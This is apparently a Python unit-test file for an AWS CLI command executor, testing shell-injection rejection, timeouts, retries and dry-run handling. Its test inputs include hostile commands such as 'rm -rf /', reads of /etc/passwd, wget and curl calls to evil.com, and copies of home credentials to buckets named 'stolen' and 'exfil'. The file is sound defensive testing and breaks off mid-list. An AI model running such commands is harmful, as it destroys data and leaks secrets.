"""Unit tests for AWSExecutor shell injection prevention."""

from __future__ import annotations

import pytest

from cloudshellgpt.executor import AWSExecutor, ExecutorError


@pytest.fixture
def executor() -> AWSExecutor:
    """Create a default AWSExecutor instance."""
    return AWSExecutor()


class TestExecutorError:
    """Tests for ExecutorError custom exception."""

    def test_executor_error_stores_message(self) -> None:
        err = ExecutorError("something went wrong")
        assert err.message == "something went wrong"
        assert str(err) == "something went wrong"

    def test_executor_error_is_exception(self) -> None:
        assert issubclass(ExecutorError, Exception)


class TestValidateCommandPrefix:
    """Tests for 'must start with aws' validation."""

    def test_rejects_empty_string(self, executor: AWSExecutor) -> None:
        result = executor.run("")
        assert result.exit_code == 1
        assert "empty" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_whitespace_only(self, executor: AWSExecutor) -> None:
        result = executor.run("   ")
        assert result.exit_code == 1
        assert "empty" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_non_aws_command(self, executor: AWSExecutor) -> None:
        result = executor.run("ls -la")
        assert result.exit_code == 1
        assert "must start with 'aws'" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_notaws_prefix(self, executor: AWSExecutor) -> None:
        result = executor.run("notaws s3 ls")
        assert result.exit_code == 1
        assert "must start with 'aws'" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_aws_as_substring(self, executor: AWSExecutor) -> None:
        result = executor.run("awscli s3 ls")
        assert result.exit_code == 1
        assert "must start with 'aws'" in result.error.lower()  # type: ignore[union-attr]

    def test_accepts_bare_aws(self, executor: AWSExecutor) -> None:
        # 'aws' alone is valid (shows help), though it may fail at execution
        # Validation should pass — subprocess may return non-zero but no security error
        result = executor.run("aws")
        assert result.error is None or "Security" not in result.error

    def test_accepts_aws_s3_ls(self, executor: AWSExecutor) -> None:
        # This might fail because AWS CLI isn't configured, but should not
        # be rejected by validation
        result = executor.run("aws s3 ls")
        assert result.error != "Security: command must start with 'aws'"


class TestShellInjectionPrevention:
    """Tests for shell metacharacter detection."""

    def test_rejects_pipe(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls | grep bucket")
        assert result.exit_code == 1
        assert "pipe" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_command_chaining_and(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls && rm -rf /")
        assert result.exit_code == 1
        assert "chaining" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_command_chaining_or(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls || echo pwned")
        assert result.exit_code == 1
        assert "chaining" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_semicolon(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls; rm -rf /")
        assert result.exit_code == 1
        assert "separator" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_backticks(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 cp `whoami` s3://bucket/")
        assert result.exit_code == 1
        assert "backtick" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_dollar_paren_substitution(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 cp $(cat /etc/passwd) s3://bucket/")
        assert result.exit_code == 1
        assert "command substitution" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_output_redirect(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls > /tmp/output.txt")
        assert result.exit_code == 1
        assert "redirect" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_append_redirect(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls >> /tmp/output.txt")
        assert result.exit_code == 1
        assert "redirect" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_input_redirect(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 cp < /etc/passwd s3://bucket/")
        assert result.exit_code == 1
        assert "redirect" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_stderr_redirect(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls 2> /dev/null")
        assert result.exit_code == 1
        assert "stderr redirect" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_background_ampersand(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls &")
        assert result.exit_code == 1
        assert "background" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_background_ampersand_mid_command(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls & echo pwned")
        assert result.exit_code == 1
        assert "background" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_env_var_expansion(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 cp $HOME/secret s3://bucket/")
        assert result.exit_code == 1
        assert "variable" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_env_var_braces(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 cp ${HOME}/secret s3://bucket/")
        assert result.exit_code == 1
        assert "variable" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_heredoc(self, executor: AWSExecutor) -> None:
        result = executor.run("aws cloudformation create-stack << EOF")
        assert result.exit_code == 1
        assert "here-doc" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_herestring(self, executor: AWSExecutor) -> None:
        result = executor.run("aws lambda invoke <<< input")
        assert result.exit_code == 1
        assert "here-string" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_process_substitution_input(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 cp <(echo data) s3://bucket/")
        assert result.exit_code == 1
        assert "process substitution" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_process_substitution_output(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 cp s3://bucket/file >(cat)")
        assert result.exit_code == 1
        assert "process substitution" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_newline_injection(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls\nrm -rf /")
        assert result.exit_code == 1
        assert "newline" in result.error.lower()  # type: ignore[union-attr]

    def test_rejects_null_byte(self, executor: AWSExecutor) -> None:
        result = executor.run("aws s3 ls\x00evil")
        assert result.exit_code == 1
        assert "null byte" in result.error.lower()  # type: ignore[union-attr]


class TestStdinDashException:
    """Tests que verifican la excepción del argumento literal '-' (AC-2.2).

    El carácter '-' usado como argumento standalone para stdin/stdout en comandos
    AWS CLI (e.g., `aws s3 cp - s3://bucket/file`) debe ser ACEPTADO por el executor,
    mientras que los redirects reales (`aws s3 ls > output.txt`) deben ser RECHAZADOS.
    """

    def test_dash_as_stdin_arg_passes_validation(self, executor: AWSExecutor) -> None:
        # 'aws s3 cp - s3://bucket/file' uses '-' as stdin
        # This should pass validation (may fail at execution if no AWS config)
        result = executor.run("aws s3 cp - s3://bucket/file")
        # Should NOT be rejected for security reasons
        assert result.error is None or "Security" not in result.error

    def test_dash_as_argument_not_rejected(self, executor: AWSExecutor) -> None:
        # Ensure '-' in various positions doesn't trigger false positives
        result = executor.run("aws s3 cp s3://bucket/file -")
        assert result.error is None or "Security" not in result.error

    # -----------------------------------------------------------------------
    # Comandos con '-' como stdin/stdout que DEBEN SER ACEPTADOS
    # -----------------------------------------------------------------------

    @pytest.mark.parametrize(
        "command",
        [
            # stdin upload
            "aws s3 cp - s3://bucket/file",
            # stdout download
            "aws s3 cp s3://bucket/file -",
            # bucket con guiones — no debe confundir al validador
            "aws s3 cp - s3://my-bucket/my-file.txt",
            # flag antes del dash
            "aws s3 cp --quiet - s3://bucket/file",
        ],
        ids=[
            "stdin_upload",
            "stdout_download",
            "bucket_name_with_dashes",
            "flag_before_dash",
        ],
    )
    def test_dash_stdin_stdout_accepted(self, executor: AWSExecutor, command: str) -> None:
        """Verifica que comandos con '-' como stdin/stdout pasan validación."""
        result = executor.run(command)
        # No debe ser rechazado por razones de seguridad
        assert result.error is None or "Security" not in result.error

    # -----------------------------------------------------------------------
    # Comandos con operadores de redirección que DEBEN SER RECHAZADOS
    # -----------------------------------------------------------------------

    @pytest.mark.parametrize(
        "command",
        [
            # output redirect
            "aws s3 ls > output.txt",
            # output redirect con path
            "aws s3 ls > /tmp/output.txt",
            # input redirect
            "aws s3 cp < input.txt s3://bucket/file",
            # append redirect
            "aws s3 ls >> appended.txt",
        ],
        ids=[
            "output_redirect",
            "output_redirect_with_path",
            "input_redirect",
            "append_redirect",
        ],
    )
    def test_real_redirects_rejected(self, executor: AWSExecutor, command: str) -> None:
        """Verifica que los operadores de redirección reales son rechazados."""
        result = executor.run(command)
        assert result.exit_code == 1, f"Se esperaba exit_code=1 para redirect: {command!r}"
        assert result.error is not None
        assert "redirect" in result.error.lower(), (
            f"Se esperaba 'redirect' en el error, pero fue: {result.error!r}"
        )

    # -----------------------------------------------------------------------
    # Casos borde: '-' combinado con redirects reales — DEBEN SER RECHAZADOS
    # -----------------------------------------------------------------------

    def test_dash_with_real_redirect_is_rejected(self, executor: AWSExecutor) -> None:
        """Verifica que tener '-' NO exime si hay un redirect real también."""
        # Tiene '-' PERO también tiene un redirect real "> log.txt"
        result = executor.run("aws s3 cp - s3://bucket/file > log.txt")
        assert result.exit_code == 1, "Se esperaba rechazo cuando hay '-' Y un redirect real"
        assert result.error is not None
        assert "redirect" in result.error.lower(), (
            f"Se esperaba 'redirect' en el error, pero fue: {result.error!r}"
        )


class TestExecutorTimeout:
    """Tests for configurable timeout."""

    def test_default_timeout_is_30(self) -> None:
        """El timeout por defecto del executor debe ser 30."""
        executor = AWSExecutor()
        assert executor.timeout == 30

    def test_custom_timeout_is_used(self) -> None:
        """El executor debe aceptar un timeout personalizado."""
        executor = AWSExecutor(timeout=60)
        assert executor.timeout == 60

    def test_timeout_passed_to_subprocess(self) -> None:
        """El timeout debe pasarse a subprocess.run."""
        from unittest.mock import MagicMock, patch

        executor = AWSExecutor(timeout=45)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="",
                stderr="",
                returncode=0,
            )
            executor.run("aws s3 ls")
            mock_run.assert_called_once()
            call_kwargs = mock_run.call_args[1]
            assert call_kwargs["timeout"] == 45

    def test_timeout_expired_returns_exit_code_124(self) -> None:
        """Cuando expira el timeout debe retornar exit_code=124."""
        import subprocess
        from unittest.mock import patch

        executor = AWSExecutor(timeout=1)
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("aws", 1)):
            with patch("time.sleep"):
                result = executor.run("aws s3 ls")
                assert result.exit_code == 124
                assert result.error == "timeout"
                assert "timed out" in result.stderr.lower()

    def test_timeout_returns_full_error_structure(self) -> None:
        """Verifica la estructura completa del resultado en timeout: exit_code, error, stderr."""
        import subprocess
        from unittest.mock import patch

        executor = AWSExecutor(timeout=30)
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("aws", 30)):
            with patch("time.sleep"):
                result = executor.run("aws s3 ls")

        assert result.exit_code == 124
        assert result.error == "timeout"
        assert result.stderr == "Command timed out after 30s"
        assert result.stdout == ""

    def test_timeout_stderr_includes_duration(self) -> None:
        """El stderr del timeout debe indicar la duración configurada."""
        import subprocess
        from unittest.mock import patch

        executor = AWSExecutor(timeout=30)
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("aws", 30)):
            with patch("time.sleep"):
                result = executor.run("aws s3 ls")

        assert "30s" in result.stderr
        assert "timed out after 30s" in result.stderr.lower()

    def test_timeout_with_custom_value_shows_correct_duration(self) -> None:
        """Con timeout=5, el mensaje debe decir '5s', no '30s'."""
        import subprocess
        from unittest.mock import patch

        executor = AWSExecutor(timeout=5)
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("aws", 5)):
            with patch("time.sleep"):
                result = executor.run("aws s3 ls")

        assert result.exit_code == 124
        assert "5s" in result.stderr
        assert "30s" not in result.stderr
        assert result.stderr == "Command timed out after 5s"

    def test_timeout_result_preserves_command(self) -> None:
        """El resultado de timeout debe preservar el comando original."""
        import subprocess
        from unittest.mock import patch

        executor = AWSExecutor(timeout=10)
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("aws", 10)):
            with patch("time.sleep"):
                result = executor.run("aws ec2 describe-instances")

        assert result.command == "aws ec2 describe-instances"

    def test_timeout_result_has_dry_run_false_by_default(self) -> None:
        """El resultado de timeout debe tener dry_run=False por defecto."""
        import subprocess
        from unittest.mock import patch

        executor = AWSExecutor(timeout=10)
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("aws", 10)):
            with patch("time.sleep"):
                result = executor.run("aws s3 ls")

        assert result.dry_run is False

    def test_all_retries_timeout_still_returns_124(self) -> None:
        """Cuando todos los reintentos expiran, el resultado final sigue siendo exit_code=124."""
        import subprocess
        from unittest.mock import patch

        executor = AWSExecutor(timeout=10, max_retries=3)
        with (
            patch("subprocess.run", side_effect=subprocess.TimeoutExpired("aws", 10)),
            patch("time.sleep") as mock_sleep,
        ):
            result = executor.run("aws s3 ls")

        assert result.exit_code == 124
        assert result.error == "timeout"
        assert "10s" in result.stderr
        # Debe haber hecho 3 sleeps (backoff entre reintentos)
        assert mock_sleep.call_count == 3

    def test_timeout_duration_ms_is_approximately_correct(self) -> None:
        """El duration_ms del timeout debe ser aproximadamente el tiempo transcurrido."""
        import subprocess
        from unittest.mock import patch

        executor = AWSExecutor(timeout=30)

        # Simulamos que time.time() devuelve valores controlados
        time_values = [100.0, 100.030]  # ~30ms simulados

        with (
            patch("subprocess.run", side_effect=subprocess.TimeoutExpired("aws", 30)),
            patch("time.sleep"),
            patch("time.time", side_effect=time_values * 4),
        ):
            result = executor.run("aws s3 ls")

        # duration_ms debe ser cercano al valor calculado (30ms en este caso)
        assert result.duration_ms == 30


class TestExponentialRetry:
    """Tests for exponential backoff retry on transient errors."""

    def test_retries_on_throttling_then_succeeds(self) -> None:
        """Simula 3 errores de throttling seguidos de éxito y verifica reintentos."""
        from unittest.mock import MagicMock, patch

        executor = AWSExecutor(max_retries=3)

        # 3 throttling errors followed by success
        throttle_response = MagicMock(
            stdout="",
            stderr="An error occurred (ThrottlingException): Rate exceeded",
            returncode=1,
        )
        success_response = MagicMock(
            stdout='{"Buckets": []}',
            stderr="",
            returncode=0,
        )

        with (
            patch(
                "subprocess.run",
                side_effect=[
                    throttle_response,
                    throttle_response,
                    throttle_response,
                    success_response,
                ],
            ) as mock_run,
            patch("time.sleep") as mock_sleep,
        ):
            result = executor.run("aws s3 ls")

        assert result.exit_code == 0
        assert result.stdout == '{"Buckets": []}'
        assert mock_run.call_count == 4
        assert mock_sleep.call_count == 3

    def test_retries_exhausted_returns_last_error(self) -> None:
        """Cuando se agotan los reintentos debe retornar el último error."""
        from unittest.mock import MagicMock, patch

        executor = AWSExecutor(max_retries=3)

        throttle_response = MagicMock(
            stdout="",
            stderr="An error occurred (ThrottlingException): Rate exceeded",
            returncode=1,
        )

        with (
            patch("subprocess.run", return_value=throttle_response),
            patch("time.sleep") as mock_sleep,
        ):
            result = executor.run("aws s3 ls")

        # 1 initial + 3 retries = 4 total, all failed
        assert result.exit_code == 1
        assert "ThrottlingException" in result.stderr
        # 3 sleeps (before retry 2, 3, 4)
        assert mock_sleep.call_count == 3

    def test_non_transient_error_not_retried(self) -> None:
        """Errores no transitorios NO deben reintentarse."""
        from unittest.mock import MagicMock, patch

        executor = AWSExecutor(max_retries=3)

        # Non-transient error (e.g. access denied)
        error_response = MagicMock(
            stdout="",
            stderr="An error occurred (AccessDenied): User is not authorized",
            returncode=1,
        )

        with (
            patch("subprocess.run", return_value=error_response) as mock_run,
            patch("time.sleep") as mock_sleep,
        ):
            result = executor.run("aws s3 ls")

        # Should NOT retry — only 1 call
        assert mock_run.call_count == 1
        assert mock_sleep.call_count == 0
        assert result.exit_code == 1
        assert "AccessDenied" in result.stderr

    def test_timeout_is_retried(self) -> None:
        """Los timeouts deben reintentarse con backoff exponencial."""
        import subprocess
        from unittest.mock import MagicMock, patch

        executor = AWSExecutor(max_retries=2, timeout=5)

        success_response = MagicMock(
            stdout="ok",
            stderr="",
            returncode=0,
        )

        with (
            patch(
                "subprocess.run",
                side_effect=[
                    subprocess.TimeoutExpired("aws", 5),
                    subprocess.TimeoutExpired("aws", 5),
                    success_response,
                ],
            ) as mock_run,
            patch("time.sleep") as mock_sleep,
        ):
            result = executor.run("aws s3 ls")

        assert result.exit_code == 0
        assert result.stdout == "ok"
        assert mock_run.call_count == 3
        assert mock_sleep.call_count == 2

    def test_file_not_found_not_retried(self) -> None:
        """FileNotFoundError no debe reintentarse."""
        from unittest.mock import patch

        executor = AWSExecutor(max_retries=3)

        with (
            patch("subprocess.run", side_effect=FileNotFoundError("aws")) as mock_run,
            patch("time.sleep") as mock_sleep,
        ):
            result = executor.run("aws s3 ls")

        assert mock_run.call_count == 1
        assert mock_sleep.call_count == 0
        assert result.exit_code == 127
        assert result.error == "aws_cli_missing"

    def test_backoff_increases_exponentially(self) -> None:
        """El backoff debe aumentar exponencialmente con jitter."""
        from unittest.mock import MagicMock, patch

        executor = AWSExecutor(max_retries=3)

        throttle_response = MagicMock(
            stdout="",
            stderr="Rate exceeded",
            returncode=1,
        )

        with (
            patch("subprocess.run", return_value=throttle_response),
            patch("time.sleep") as mock_sleep,
            patch("random.uniform", return_value=0.0),
        ):
            executor.run("aws s3 ls")

        # With jitter=0, backoffs should be exactly 1.0, 2.0, 4.0
        assert mock_sleep.call_count == 3
        sleep_args = [call_args[0][0] for call_args in mock_sleep.call_args_list]
        assert sleep_args[0] == 1.0
        assert sleep_args[1] == 2.0
        assert sleep_args[2] == 4.0

    def test_custom_max_retries(self) -> None:
        """El max_retries debe ser configurable."""
        executor = AWSExecutor(max_retries=5)
        assert executor.max_retries == 5

    def test_default_max_retries_is_3(self) -> None:
        """El max_retries por defecto debe ser 3."""
        executor = AWSExecutor()
        assert executor.max_retries == 3

    def test_all_throttling_patterns_detected(self) -> None:
        """Todos los patrones de throttling deben ser detectados como transitorios."""
        from unittest.mock import MagicMock, patch

        executor = AWSExecutor(max_retries=0)

        patterns = [
            "Throttling",
            "Rate exceeded",
            "ThrottlingException",
            "TooManyRequestsException",
            "RequestLimitExceeded",
        ]

        for pattern in patterns:
            response = MagicMock(
                stdout="",
                stderr=f"An error occurred ({pattern}): slow down",
                returncode=1,
            )
            with patch("subprocess.run", return_value=response):
                result = executor.run("aws s3 ls")
                # With max_retries=0, it just returns immediately, but we can
                # verify the detection via the _is_transient_error method
                assert executor._is_transient_error(result), (
                    f"Pattern '{pattern}' should be detected as transient"
                )

    def test_validation_errors_not_retried(self) -> None:
        """Los errores de validación no deben pasar por retry."""
        from unittest.mock import patch

        executor = AWSExecutor(max_retries=3)

        with patch("time.sleep") as mock_sleep:
            result = executor.run("ls -la")

        assert mock_sleep.call_count == 0
        assert result.exit_code == 1
        assert "Security" in (result.error or "")


# ---------------------------------------------------------------------------
# Tests parametrizados — rechazo exhaustivo de TODOS los shell metacharacters
# ---------------------------------------------------------------------------

# Lista de casos: (comando_con_metacaracter, subcadena_esperada_en_error)
# Cada comando simula un uso legítimo de AWS CLI con inyección de metacaracter.
SHELL_METACHAR_CASES: list[tuple[str, str]] = [
    # 1. Pipe
    ("aws s3 ls | grep prod", "pipe"),
    # 2. AND chaining
    ("aws ec2 describe-instances && aws s3 ls", "chaining"),
    # 3. OR chaining
    ("aws s3 ls || echo fallback", "chaining"),
    # 4. Semicolon
    ("aws iam list-users; aws s3 ls", "separator"),
    # 5. Backtick substitution
    ("aws s3 cp `whoami`.txt s3://bucket/", "backtick"),
    # 6. $(...) command substitution
    ("aws s3 cp $(date +%F).log s3://bucket/logs/", "command substitution"),
    # 7. Output redirect >
    ("aws s3 ls > /tmp/buckets.txt", "redirect"),
    # 8. Append redirect >>
    ("aws cloudwatch get-metric-data >> /tmp/metrics.log", "redirect"),
    # 9. Input redirect <
    ("aws s3 cp < /etc/hosts s3://bucket/hosts", "redirect"),
    # 10. Stderr redirect 2>
    ("aws sts get-caller-identity 2> /dev/null", "stderr redirect"),
    # 11. Background & at end
    ("aws s3 sync s3://src s3://dst &", "background"),
    # 12. Newline injection
    ("aws s3 ls\nrm -rf /", "newline"),
    # 13. Null byte
    ("aws s3 ls\x00--recursive", "null byte"),
    # 14. Here-doc <<
    ("aws cloudformation deploy << EOF", "here-doc"),
    # 15. Here-string <<<
    ("aws lambda invoke <<< inputpayload", "here-string"),
    # 16. Process substitution <(...)
    ("aws s3 cp <(cat /etc/passwd) s3://bucket/data", "process substitution"),
    # 17. Process substitution >(...)
    ("aws s3 cp s3://bucket/file >(cat)", "process substitution"),
    # 18. $VAR variable expansion
    ("aws s3 cp $SECRET_FILE s3://bucket/exfil", "variable"),
    # 19. ${VAR} variable expansion with braces
    ("aws s3 cp ${HOME}/credentials s3://bucket/stolen", "variable"),
]


class TestShellMetacharParametrized:
    """Tests parametrizados — rechazo exhaustivo de los 19 shell metacharacters.

    Cada caso usa un comando que parece legítimo pero contiene un metacaracter
    de shell que debe ser rechazado por seguridad.
    """

    @pytest.mark.parametrize(
        ("malicious_command", "expected_error_substring"),
        SHELL_METACHAR_CASES,
        ids=[
            "pipe",
            "and_chain",
            "or_chain",
            "semicolon",
            "backtick",
            "dollar_paren",
            "output_redirect",
            "append_redirect",
            "input_redirect",
            "stderr_redirect",
            "background_ampersand",
            "newline",
            "null_byte",
            "here_doc",
            "here_string",
            "process_sub_input",
            "process_sub_output",
            "dollar_var",
            "dollar_brace_var",
        ],
    )
    def test_rejects_shell_metacharacter(
        self,
        executor: AWSExecutor,
        malicious_command: str,
        expected_error_substring: str,
    ) -> None:
        """Verifica que el metacaracter es rechazado con exit_code=1 y error de seguridad."""
        result = executor.run(malicious_command)

        assert result.exit_code == 1, f"Se esperaba exit_code=1 para comando: {malicious_command!r}"
        assert result.error is not None, (
            f"Se esperaba un mensaje de error para: {malicious_command!r}"
        )
        assert "Security" in result.error, (
            f"El error debe mencionar 'Security', pero fue: {result.error!r}"
        )
        assert expected_error_substring in result.error.lower(), (
            f"Se esperaba '{expected_error_substring}' en el error: {result.error!r}"
        )


# ---------------------------------------------------------------------------
# Tests parametrizados — invariante: SOLO se ejecutan comandos que empiezan con `aws`
# ---------------------------------------------------------------------------

# Lista de casos: (comando_no_aws, descripción_para_id)
# Cada comando NO empieza con 'aws' y debe ser rechazado por el executor.
NON_AWS_COMMAND_CASES: list[tuple[str, str]] = [
    ("curl http://example.com", "curl_command"),
    ("rm -rf /", "rm_destructive"),
    ("ls", "ls_bare"),
    ('python -c "import os"', "python_exec"),
    ('bash -c "echo pwned"', "bash_exec"),
    ('sh -c "cat /etc/passwd"', "sh_exec"),
    ("echo hello", "echo_command"),
    ("cat /etc/passwd", "cat_file"),
    ("", "empty_string"),
    ("   ", "whitespace_only"),
    ("notaws s3 ls", "notaws_prefix"),
]


class TestExecutorOnlyRunsAwsCommands:
    """Invariante parametrizado: el executor SOLO ejecuta comandos que empiezan con `aws`.

    Se verifica exhaustivamente con al menos 11 comandos no-aws que todos son
    rechazados con exit_code=1 y un mensaje de error indicando que solo se
    permiten comandos AWS CLI.
    """

    @pytest.mark.parametrize(
        "non_aws_command",
        [case[0] for case in NON_AWS_COMMAND_CASES],
        ids=[case[1] for case in NON_AWS_COMMAND_CASES],
    )
    def test_rejects_non_aws_command(
        self,
        executor: AWSExecutor,
        non_aws_command: str,
    ) -> None:
        """Verifica que un comando no-aws es rechazado con exit_code=1 y error descriptivo."""
        result = executor.run(non_aws_command)

        assert result.exit_code == 1, (
            f"Se esperaba exit_code=1 para comando no-aws: {non_aws_command!r}"
        )
        assert result.error is not None, (
            f"Se esperaba un mensaje de error para comando no-aws: {non_aws_command!r}"
        )
        # El error debe indicar que solo se permiten comandos AWS CLI
        error_lower = result.error.lower()
        assert "must start with 'aws'" in error_lower or "empty" in error_lower, (
            f"El error debe indicar que solo se permiten comandos AWS CLI, "
            f"pero fue: {result.error!r}"
        )


# ---------------------------------------------------------------------------
# Tests parametrizados — metacharacters en POSICIONES variadas dentro del comando
# ---------------------------------------------------------------------------

# Cada tupla: (comando, subcadena_esperada_en_error, id_descriptivo)
# Nota: comandos que no empiezan con 'aws' serán rechazados por el prefijo,
# lo cual también resulta en exit_code=1 y error != None — comportamiento correcto.
METACHAR_POSITION_CASES: list[tuple[str, str]] = [
    # -----------------------------------------------------------------------
    # 1. Al inicio del comando (antes o en lugar de 'aws')
    # -----------------------------------------------------------------------
    # Pipe al inicio — rechazado por prefijo (no empieza con 'aws')
    ("| aws s3 ls", "must start with 'aws'"),
    # Semicolon al inicio
    ("; aws s3 ls", "must start with 'aws'"),
    # Backtick al inicio
    ("`whoami` aws s3 ls", "must start with 'aws'"),
    # $() al inicio
    ("$(id) aws s3 ls", "must start with 'aws'"),
    # && al inicio
    ("&& aws s3 ls", "must start with 'aws'"),
    # -----------------------------------------------------------------------
    # 2. En el medio del comando (entre subcomando y argumentos)
    # -----------------------------------------------------------------------
    # Pipe en el medio
    ("aws s3 ls | grep prod", "pipe"),
    # Semicolon en el medio
    ("aws ec2 describe-instances ; aws s3 ls", "separator"),
    # && en el medio
    ("aws iam list-users && curl evil.com", "chaining"),
    # || en el medio
    ("aws s3 ls || wget http://evil.com/payload", "chaining"),
    # Backtick en el medio (dentro de un argumento)
    ("aws s3 cp s3://bucket/`hostname`/file .", "backtick"),
    # $() en el medio
    ("aws ec2 run-instances --tag-specifications $(cat tags.json)", "command substitution"),
    # $VAR en el medio
    ("aws s3 cp s3://bucket/$USER/config local.txt", "variable"),
    # -----------------------------------------------------------------------
    # 3. Al final del comando
    # -----------------------------------------------------------------------
    # Background & al final
    ("aws s3 sync s3://src s3://dst &", "background"),
    # Pipe al final (sin comando destino)
    ("aws s3 ls |", "pipe"),
    # Semicolon al final
    ("aws sts get-caller-identity ;", "separator"),
    # Output redirect al final
    ("aws s3 ls > /tmp/out.txt", "redirect"),
    # Append redirect al final
    ("aws cloudwatch get-metric-data >> metrics.log", "redirect"),
    # Backtick al final
    ("aws s3 cp file.txt s3://bucket/`date`", "backtick"),
    # -----------------------------------------------------------------------
    # 4. Dentro de argumentos (embebido en valores de flags/parámetros)
    # -----------------------------------------------------------------------
    # $() dentro de un path S3
    ("aws s3 cp s3://$(whoami)/file .", "command substitution"),
    # ${} dentro de un valor de tag
    ("aws ec2 create-tags --tags Key=Owner,Value=${USER}", "variable"),
    # Backtick dentro de un nombre de archivo
    ("aws s3 cp `pwd`/local.txt s3://bucket/", "backtick"),
    # Pipe dentro de un argumento --query
    ("aws ec2 describe-instances --query 'Reservations[*]|sort_by(@,&Name)'", "pipe"),
    # Semicolon dentro de un valor
    ("aws ssm put-parameter --value 'pass;word123'", "separator"),
    # $() anidado en un argumento --payload
    ('aws lambda invoke --payload \'{"key": "$(cat secret)"}\' out.json', "command substitution"),
    # -----------------------------------------------------------------------
    # 5. Entre comillas simples vs dobles (metacharacters embebidos en strings)
    # -----------------------------------------------------------------------
    # Backtick dentro de comillas dobles
    ('aws s3 cp "file-`date`.txt" s3://bucket/', "backtick"),
    # $() dentro de comillas dobles
    ('aws s3 cp "$(whoami)-report.csv" s3://bucket/', "command substitution"),
    # $VAR dentro de comillas dobles
    ('aws s3 cp "$HOME/secret.txt" s3://bucket/', "variable"),
    # Pipe dentro de comillas simples (igualmente rechazado — regex no distingue quoting)
    ("aws s3 cp 'file | name.txt' s3://bucket/", "pipe"),
    # Semicolon dentro de comillas simples
    ("aws ssm put-parameter --name '/app/config' --value 'host;port'", "separator"),
    # ${} dentro de comillas dobles
    ('aws logs filter-log-events --filter-pattern "${PATTERN}"', "variable"),
]


class TestMetacharPositionVaried:
    """Tests parametrizados que verifican rechazo de metacharacters según su POSICIÓN.

    Cubre 5 categorías de posición:
    1. Al inicio del comando (antes de 'aws')
    2. En el medio (entre subcomandos y argumentos)
    3. Al final del comando
    4. Dentro de argumentos (embebido en valores de flags)
    5. Entre comillas simples y dobles
    """

    @pytest.mark.parametrize(
        ("command", "expected_error_substring"),
        METACHAR_POSITION_CASES,
        ids=[
            # 1. Al inicio
            "start_pipe",
            "start_semicolon",
            "start_backtick",
            "start_dollar_paren",
            "start_and_chain",
            # 2. En el medio
            "mid_pipe",
            "mid_semicolon",
            "mid_and_chain",
            "mid_or_chain",
            "mid_backtick_in_path",
            "mid_dollar_paren_in_arg",
            "mid_dollar_var_in_path",
            # 3. Al final
            "end_background_ampersand",
            "end_pipe_dangling",
            "end_semicolon",
            "end_output_redirect",
            "end_append_redirect",
            "end_backtick",
            # 4. Dentro de argumentos
            "arg_dollar_paren_s3_path",
            "arg_dollar_brace_tag_value",
            "arg_backtick_pwd",
            "arg_pipe_in_query",
            "arg_semicolon_in_value",
            "arg_dollar_paren_nested_payload",
            # 5. Entre comillas
            "quotes_double_backtick",
            "quotes_double_dollar_paren",
            "quotes_double_dollar_var",
            "quotes_single_pipe",
            "quotes_single_semicolon",
            "quotes_double_dollar_brace",
        ],
    )
    def test_rejects_metachar_regardless_of_position(
        self,
        executor: AWSExecutor,
        command: str,
        expected_error_substring: str,
    ) -> None:
        """Verifica que el metacaracter es rechazado sin importar su posición en el comando."""
        result = executor.run(command)

        assert result.exit_code == 1, (
            f"Se esperaba exit_code=1 para comando con metacaracter en posición variada: "
            f"{command!r}"
        )
        assert result.error is not None, f"Se esperaba un mensaje de error para: {command!r}"
        assert expected_error_substring in result.error.lower(), (
            f"Se esperaba '{expected_error_substring}' en el error, pero fue: {result.error!r}"
        )


# ---------------------------------------------------------------------------
# Tests parametrizados — inyección de --dry-run en servicios soportados
# ---------------------------------------------------------------------------

# Comandos que SÍ deben recibir --dry-run
DRY_RUN_SUPPORTED_CASES: list[tuple[str, str]] = [
    (
        "aws ec2 run-instances --instance-type t3.micro --image-id ami-12345",
        "aws ec2 run-instances --instance-type t3.micro --image-id ami-12345 --dry-run",
    ),
    (
        "aws ec2 terminate-instances --instance-ids i-12345",
        "aws ec2 terminate-instances --instance-ids i-12345 --dry-run",
    ),
    (
